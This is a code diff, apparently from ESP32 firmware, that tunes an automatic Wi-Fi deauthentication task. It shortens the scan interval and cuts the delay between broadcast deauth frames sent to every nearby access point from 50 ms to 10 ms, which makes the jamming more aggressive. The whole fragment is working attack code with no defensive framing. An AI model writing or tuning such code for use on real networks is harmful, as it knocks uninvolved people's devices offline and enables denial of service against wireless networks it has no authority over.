@@ -1070,7 +1070,7 @@ void wifi_auto_deauth_task(void* Parameter)
         ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, false));
 
 
-        vTaskDelay(pdMS_TO_TICKS(3000));
+        vTaskDelay(pdMS_TO_TICKS(1500));
 
         esp_wifi_scan_stop();
 
@@ -1104,7 +1104,7 @@ void wifi_auto_deauth_task(void* Parameter)
                 {
                     uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                     wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
-                    vTaskDelay(50 / portTICK_PERIOD_MS);
+                    vTaskDelay(10 / portTICK_PERIOD_MS);
                 }
             }
         }
